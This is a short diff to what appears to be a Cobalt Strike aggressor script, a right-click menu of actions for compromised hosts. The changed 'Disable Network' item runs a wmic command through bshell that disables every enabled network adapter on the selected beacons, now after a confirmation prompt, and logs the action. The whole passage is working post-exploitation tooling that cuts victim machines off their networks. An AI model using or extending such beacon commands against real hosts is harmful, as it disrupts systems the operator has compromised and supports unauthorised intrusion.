@@ -26,9 +26,9 @@ popup beacon_bottom {
       			}, @ids => $1));
 		}
 		item "Disable Network" {
-			prompt_text("Specify the interface to disable:", "7", lambda({
+			prompt_confirm("Are you SURE you want to disable all network interfaces?", "Confirm", lambda({
 				bshell(@ids,"wmic path win32_networkadapter where netenabled='TRUE' call disable");
-				blog(@ids,"Disabling network interface $1 ");
+				blog(@ids,"Disabling network interfaces!");
 			}, @ids => $1));
     		}
     item "IE Kiosk Popup" {
